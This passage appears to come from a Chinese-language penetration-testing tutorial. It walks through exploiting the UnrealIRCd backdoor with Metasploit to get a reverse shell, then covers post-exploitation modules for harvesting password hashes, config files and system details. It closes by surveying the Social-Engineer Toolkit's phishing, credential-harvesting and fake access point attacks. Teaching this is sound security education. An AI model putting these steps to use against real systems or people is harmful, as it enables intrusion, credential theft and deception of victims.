你可以通过工作区来整理项目，可以为实验环境创建新工作区，`-a`参数用于添加工作区。接下来，为确保新工作区被选中，输入“workspace”命令，即可列出Metasploit数据库中存储的所有工作区。
接下来，使用“search”命令搜索你要用的漏洞利用模块，搜索结果会列出IRCD服务的相关利用模块，同时会标注该模块利用成功的相对评级。你可以复制该利用模块的名称，用于后续命令中。使用“info”命令可获取该利用模块的额外信息，返回内容会包含相关参考资料以及该利用模块的说明，建议先查看这些信息再继续操作，避免浪费时间。
要指示Metasploit框架使用该利用模块攻击目标，需输入“use”命令。输入“use”命令后，Metasploit框架的命令提示符会从“msf”变为“msf exploit (unreal_ircd_3281_backdoor)”。如果需要设置利用模块的选项，可以执行“show options”命令查看。例如如果需要设置远程主机必填项（即被攻击系统的IP地址），修改任意选项的值时，需先输入“set”关键字，随后跟选项名称，最后输入选项值即可。
要执行攻击载荷，输入“show payload”命令，即可列出该利用模块对应的所有适配载荷，可选载荷很多，本示例中选择“reverse shell payload”即可。之所以选择该载荷，是因为它是UNIX shell中常用的载荷，此处“常用”指过往使用者普遍反馈成功率很高。接下来需要检查所选载荷的选项，载荷选项会要求你输入本地主机的IP地址，你可以通过“ifconfig”命令查看本机IP，输入对应值后按下回车键即可。
要发起攻击，输入“exploit”命令后按下回车键。Metasploit框架会启动攻击，并在确认攻击成功后显示“Command shell session 1 opened”，同时给出反向shell的源IP与目标IP。
当系统被攻陷到这一步，就可以开展后续的后渗透活动。后渗透是攻击流程中，攻击者获取攻击全部价值的阶段。系统被攻陷后，攻击者通常会开展以下操作：
- 快速评估本地环境特征，包括基础设施、网络连通性、用户账号，是否存在可用于发起后续攻击的目标文件或应用
- 定位、复制或修改高价值目标文件，比如数据文件、财务信息
- 创建额外用户账号、修改系统配置，为后续后渗透活动提供支持
- 通过窃取管理员或系统级凭据提升权限等级（即纵向提权），同时尝试攻击其他数据系统（即横向渗透）
通过被攻陷的系统作为跳板攻击整个内网，安装持久化后门和隐蔽信道，以此维持控制权，并与被攻陷系统建立安全通信。最后，攻击者可以清除被攻陷系统上的攻击痕迹。
后渗透活动要取得成功，需要攻击者充分了解目标系统操作系统，才能确保绕过防护控制机制。你已经掌握过系统利用方法，因此可以按下“Ctrl+Z”将当前会话置于后台，输入“y”确认操作即可。要知道后续使用的后渗透模块对应的会话ID，这一点至关重要，你可以通过“sessions”命令获取会话ID，如果是首次使用该工具，你的会话ID就是1。
可以尝试的第一个模块是“hashdump”，该模块会尝试收集系统的密码哈希值，这里只需要设置会话ID即可，继续操作前需要在选项区域设置好会话ID。
Metasploit框架中另一个很有趣的后渗透模块是“enum_configs”，它可以获取所有重要配置文件，并存储到你的本地系统中，你会在输出中看到从远程系统获取到的配置文件样本。如果想用文本编辑器查看其中的txt文件，可以复制文件路径，打开新的控制台，使用名为“nano text editor”的工具查看文件内容。准备继续下一步时，关闭当前窗口，回到主操作窗口。
接下来需要使用“enum_network”模块枚举网络配置，该命令会把所有发现的结果保存为文本文件，你可以查看这些文件，了解远程系统上部署了哪些安全设施，比如入侵检测系统（IDS）、杀毒软件、入侵防御系统（IPS）或防火墙。接下来你可以使用“enum_protections”模块，也可以用其他模块枚举整个系统的信息，包括用户账号、已安装的软件包、运行的服务、硬盘、Linux版本等。要获取所有这些信息，可以使用“enum_system”命令，之后查看生成的文本文件内容即可。如果要获取用户历史记录信息，Metasploit框架也有对应的模块，名为“enum_users_history”，它会将这些信息存储到你的本地系统中。

# 第33章 社会工程学工具包
社会工程学是你需要了解的重要技术，接下来你会明白黑客如何利用社会工程学应用诱骗受害者触发漏洞陷阱。
SET（社会工程学工具包）是一个开源的、基于Python开发的框架，专门用于发起社会工程学攻击。社会工程学工具包的一大优势是能够与Metasploit框架互联互通，后者可提供渗透所需的攻击载荷、绕过杀毒软件的加密功能，以及当被攻陷系统向攻击者发送shell时用于建立连接的回调模块。
要启动社会工程学工具包，输入“setoolkit”命令后按下回车键即可。该应用加载后会提供多个可选选项：
- 社会工程学攻击：提供多种社会工程学攻击方法
- 快速渗透测试：可使用部分专用工具快速开展测试
输入数字2即可选择快速渗透测试选项。接下来会出现更多可选选项：
- SQL数据库密码破解工具
- 基于Python的定制化利用工具
- 用户枚举工具
- PSEXEC PowerShell注入工具
输入数字99可返回主菜单，如果选择包含社会工程学攻击工具的第一个选项，只需在键盘上按下数字1即可。选择该选项后，会再次出现更多可选选项：
- 鱼叉式网络钓鱼攻击向量：攻击者可创建附带漏洞利用程序的邮件，发送给指定目标
- 网站攻击向量：可使用多种基于Web的攻击方式
如果要查看该选项的详细内容，只需在键盘上按下数字2即可。



- 列表首位是Java小程序攻击方法，该方法通过伪造Java证书投递基于Metasploit的载荷。这是公认的最成功的攻击方式之一，可针对Windows、Linux、OSX等所有系统目标生效。
- 列表第二位是Metasploit浏览器利用方法，该方法通过iFrame攻击投递Metasploit载荷。
- 列表第三位是凭据窃取攻击方法，该方法会克隆目标网站，并自动重写POST参数，使攻击者能够拦截并窃取用户凭据。
- 列表第四位是标签页钓鱼攻击方法，该方法会用克隆页面替换非活动浏览器标签页的内容，且该克隆页面会链接回攻击者。
- 之后是网页劫持攻击方法，该方法利用iFrame替换技术，使被高亮选中的URL链接看起来合法。
- 列表最后一项是多攻击组合网页方法，攻击者可以选择一种、多种或所有可同时发动的攻击。如果你返回上一界面查看其余列出的攻击方式，例如恶意媒介生成器，会生成一个自动运行文件及Metasploit载荷，一旦该文件被拷贝到U盘并插入目标系统，就会触发自动运行，进而入侵该系统。
- 接下来，它会生成载荷与监听器模块，这是一种快速菜单驱动的Metasploit载荷生成方法。
- 之后是群发邮件攻击，该攻击允许攻击者向单个邮箱地址或多个地址列表发送多封定制化邮件。
- 接下来是基于Arduino的攻击向量，可用于对Arduino设备进行编程。这类设备连接到实体Windows系统时会注册为USB键盘，因此可以绕过仅禁用自动运行及其他终端安全措施的安全防护。
- 例如无线接入点攻击向量会在攻击者系统上创建虚假无线接入点和DHCP服务器，将所有DNS查询重定向至攻击者。随后黑客可发动各类攻击，例如Java小程序攻击或凭据窃取攻击。
- 例如二维码生成攻击向量可生成包含与攻击关联的指定URL的二维码。
- Powershell攻击向量允许攻击者创建依赖Powershell的攻击，Powershell是一款命令行壳与脚本语言，可用于Windows、Vista及以上所有版本的系统。
- 最后是第三方模块，允许攻击者将远程管理工具作为Java小程序攻击的一部分使用，或作为独立载荷使用。该工具是文本式、菜单驱动的远程访问工具。
